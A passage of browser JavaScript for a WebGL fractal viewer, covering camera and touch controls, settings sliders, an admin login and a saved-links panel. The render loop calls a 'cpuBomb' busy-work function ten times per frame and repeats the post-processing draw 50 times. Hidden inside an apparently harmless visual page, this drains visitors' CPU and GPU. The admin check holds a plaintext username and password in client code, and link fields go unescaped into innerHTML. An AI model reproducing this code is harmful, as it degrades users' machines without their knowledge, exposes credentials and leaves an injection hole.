        x = Math.sqrt(Math.abs(x) + 1) * Math.log(i + 2);
        x = Math.pow(x, 1.001) % 999999999;
    }
    return x;
}

function updateCamera(dt) {
    const smooth = 1.0 - Math.exp(-dt * 6.0);
    camera.theta += (camera.targetTheta - camera.theta) * smooth;
    camera.phi += (camera.targetPhi - camera.phi) * smooth;
    camera.radius += (camera.targetRadius - camera.radius) * smooth;
    camera.phi = Math.max(0.1, Math.min(Math.PI - 0.1, camera.phi));
    camera.radius = Math.max(camera.radius, 0.5);
    const st = Math.sin(camera.theta);
    const ct = Math.cos(camera.theta);
    const sp = Math.sin(camera.phi);
    const cp = Math.cos(camera.phi);
    camera.pos[0] = camera.targetCenter[0] + camera.radius * st * sp;
    camera.pos[1] = camera.targetCenter[1] + camera.radius * cp;
    camera.pos[2] = camera.targetCenter[2] + camera.radius * ct * sp;
    if (!input.mouseDown && !input.rightMouseDown && input.touchCount === 0) {
        camera.targetTheta += dt * CONFIG.zoomSpeed * 0.2;
    }
}

function render(time) {
    cpuBomb(); cpuBomb(); cpuBomb(); cpuBomb(); cpuBomb();
    cpuBomb(); cpuBomb(); cpuBomb(); cpuBomb(); cpuBomb();

    const t = time * 0.001;
    const dt = Math.min(t - lastTime, 0.05);
    lastTime = t;

    frameCount++;
    if (t - fpsTime > 1.0) {
        currentFPS = frameCount;
        frameCount = 0;
        fpsTime = t;
        document.getElementById('fps').textContent = 'FPS: ' + currentFPS;
    }

    updateCamera(dt);

    if (gl && program && postProgram) {
        gl.bindFramebuffer(gl.FRAMEBUFFER, frameBuffer);
        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, frameTexture, 0);
        gl.useProgram(program);
        gl.uniform1f(uTime, t);
        gl.uniform2f(uResolution, canvas.width, canvas.height);
        gl.uniform3f(uCameraPos, camera.pos[0], camera.pos[1], camera.pos[2]);
        gl.uniform3f(uCameraTarget, camera.targetCenter[0], camera.targetCenter[1], camera.targetCenter[2]);
        gl.uniform3f(uCameraUp, 0, 1, 0);
        gl.uniform4f(uConfig, CONFIG.maxIterations, CONFIG.fractalPower, CONFIG.colorIntensity, CONFIG.bloomStrength);
        gl.uniform1i(uMode, CONFIG.renderMode);
        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);

        gl.bindFramebuffer(gl.FRAMEBUFFER, null);
        gl.useProgram(postProgram);
        gl.activeTexture(gl.TEXTURE0);
        gl.bindTexture(gl.TEXTURE_2D, frameTexture);
        gl.uniform1i(postUTexture, 0);
        gl.uniform2f(postUResolution, canvas.width, canvas.height);
        gl.uniform4f(postUConfig, CONFIG.maxIterations, CONFIG.fractalPower, CONFIG.colorIntensity, CONFIG.bloomStrength);
        gl.uniform1f(postUTime, t);
        for(let pass=0; pass<50; pass++) {
            gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
        }
    }

    requestAnimationFrame(render);
}

function initInputs() {
    document.addEventListener('mousedown', e => {
        if (e.target.closest('#ui-controls') || e.target.closest('#hamburger') || 
            e.target.closest('#owner-btn') || e.target.closest('#login-panel') ||
            e.target.closest('#admin-panel')) return;
        if (e.button === 0) input.mouseDown = true;
        else if (e.button === 2) input.rightMouseDown = true;
        input.lastX = e.clientX;
        input.lastY = e.clientY;
    });
    document.addEventListener('mouseup', e => {
        if (e.button === 0) input.mouseDown = false;
        if (e.button === 2) input.rightMouseDown = false;
    });
    document.addEventListener('mousemove', e => {
        const dx = e.clientX - input.lastX;
        const dy = e.clientY - input.lastY;
        if (input.mouseDown) {
            camera.targetTheta -= dx * 0.005;
            camera.targetPhi -= dy * 0.005;
        }
        if (input.rightMouseDown) {
            const speed = camera.radius * 0.002;
            camera.targetCenter[0] -= dx * speed * Math.cos(camera.theta);
            camera.targetCenter[2] += dx * speed * Math.sin(camera.theta);
            camera.targetCenter[1] += dy * speed;
        }
        input.lastX = e.clientX;
        input.lastY = e.clientY;
    });
    document.addEventListener('wheel', e => {
        if (e.target.closest('#ui-controls')) return;
        e.preventDefault();
        camera.targetRadius *= Math.exp(e.deltaY * 0.001);
    }, { passive: false });
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('touchstart', e => {
        if (e.target.closest('#ui-controls') || e.target.closest('#hamburger') || 
            e.target.closest('#owner-btn') || e.target.closest('#login-panel') ||
            e.target.closest('#admin-panel')) return;
        input.touchCount = e.touches.length;
        if (e.touches.length === 1) {
            input.lastX = e.touches[0].clientX;
            input.lastY = e.touches[0].clientY;
        } else if (e.touches.length === 2) {
            const dx = e.touches[0].clientX - e.touches[1].clientX;
            const dy = e.touches[0].clientY - e.touches[1].clientY;
            input.touchDist = Math.sqrt(dx*dx + dy*dy);
        }
    }, { passive: false });
    document.addEventListener('touchmove', e => {
        if (e.target.closest('#ui-controls')) return;
        e.preventDefault();
        if (e.touches.length === 1 && input.touchCount === 1) {
            const dx = e.touches[0].clientX - input.lastX;
            const dy = e.touches[0].clientY - input.lastY;
            camera.targetTheta -= dx * 0.006;
            camera.targetPhi -= dy * 0.006;
            input.lastX = e.touches[0].clientX;
            input.lastY = e.touches[0].clientY;
        } else if (e.touches.length === 2) {
            const dx = e.touches[0].clientX - e.touches[1].clientX;
            const dy = e.touches[0].clientY - e.touches[1].clientY;
            const dist = Math.sqrt(dx*dx + dy*dy);
            camera.targetRadius *= input.touchDist / dist;
            input.touchDist = dist;
            const cx = (e.touches[0].clientX + e.touches[1].clientX) * 0.5;
            const cy = (e.touches[0].clientY + e.touches[1].clientY) * 0.5;
            const pdx = cx - input.lastX;
            const pdy = cy - input.lastY;
            const speed = camera.radius * 0.001;
            camera.targetCenter[0] -= pdx * speed * Math.cos(camera.theta);
            camera.targetCenter[2] += pdx * speed * Math.sin(camera.theta);
            camera.targetCenter[1] += pdy * speed;
            input.lastX = cx;
            input.lastY = cy;
        }
    }, { passive: false });
    document.addEventListener('touchend', e => {
        input.touchCount = e.touches.length;
    });
}

function initUI() {
    const sliders = {
        'iterations': { key: 'maxIterations', display: 'iter-val', int: true },
        'power': { key: 'fractalPower', display: 'power-val' },
        'color-intensity': { key: 'colorIntensity', display: 'color-val' },
        'zoom-speed': { key: 'zoomSpeed', display: 'zoom-val' },
        'bloom': { key: 'bloomStrength', display: 'bloom-val' }
    };
    for (const [id, cfg] of Object.entries(sliders)) {
        const el = document.getElementById(id);
        const disp = document.getElementById(cfg.display);
        el.addEventListener('input', () => {
            CONFIG[cfg.key] = cfg.int ? parseInt(el.value) : parseFloat(el.value);
            disp.textContent = cfg.int ? CONFIG[cfg.key] : CONFIG[cfg.key].toFixed(2);
        });
    }
    document.querySelectorAll('.mode-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            CONFIG.renderMode = parseInt(btn.dataset.mode);
        });
    });
}

function initAdmin() {
    const hamburger = document.getElementById('hamburger');
    const ownerBtn = document.getElementById('owner-btn');
    const loginPanel = document.getElementById('login-panel');
    const adminPanel = document.getElementById('admin-panel');
    let menuOpen = false;
    hamburger.addEventListener('click', () => {
        menuOpen = !menuOpen;
        ownerBtn.style.display = menuOpen ? 'block' : 'none';
    });
    ownerBtn.addEventListener('click', () => {
        loginPanel.style.display = 'block';
        menuOpen = false;
        ownerBtn.style.display = 'none';
    });
    document.getElementById('login-close').addEventListener('click', () => {
        loginPanel.style.display = 'none';
    });
    document.getElementById('login-submit').addEventListener('click', () => {
        const user = document.getElementById('login-user').value;
        const pass = document.getElementById('login-pass').value;
        if (user === 'velonix4n' && pass === 'Leader_Cipher4n') {
            loginPanel.style.display = 'none';
            adminPanel.style.display = 'block';
            document.getElementById('login-user').value = '';
            document.getElementById('login-pass').value = '';
            document.getElementById('login-error').style.display = 'none';
            renderLinks();
        } else {
            document.getElementById('login-error').style.display = 'block';
        }
    });
    document.getElementById('add-link').addEventListener('click', () => {
        const url = document.getElementById('link-url').value.trim();
        const desc = document.getElementById('link-desc').value.trim();
        const img = document.getElementById('link-img').value.trim();
        if (url) {
            savedLinks.push({ url, desc, img, id: Date.now() });
            localStorage.setItem('cyberfractal_links', JSON.stringify(savedLinks));
            document.getElementById('link-url').value = '';
            document.getElementById('link-desc').value = '';
            document.getElementById('link-img').value = '';
            renderLinks();
        }
    });
    document.getElementById('clear-links').addEventListener('click', () => {
        savedLinks = [];
        localStorage.setItem('cyberfractal_links', JSON.stringify(savedLinks));
        renderLinks();
    });
}

function renderLinks() {
    const container = document.getElementById('links-container');
    container.innerHTML = '';
    savedLinks.forEach(link => {
        const item = document.createElement('div');
        item.className = 'link-item';
        item.innerHTML = `
            ${link.img ? `<img src="${link.img}" onerror="this.style.display='none'">` : '<div style="width:50px;height:50px;background:rgba(0,255,255,0.1);border:1px solid rgba(0,255,255,0.3);"></div>'}
            <div class="info">
                <div class="title">${link.url}</div>
                <div class="desc">${link.desc || 'No description'}</div>
            </div>
            <button class="delete-btn" data-id="${link.id}">DELETE</button>
        `;
        container.appendChild(item);
    });
    document.querySelectorAll('.delete-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const id = parseInt(btn.dataset.id);
            savedLinks = savedLinks.filter(l => l.id !== id);
            localStorage.setItem('cyberfractal_links', JSON.stringify(savedLinks));
            renderLinks();
        });
    });
}

window.addEventListener('load', () => {
    initWebGL();
    initInputs();
    initUI();
    initAdmin();
    requestAnimationFrame(render);
});
</script>
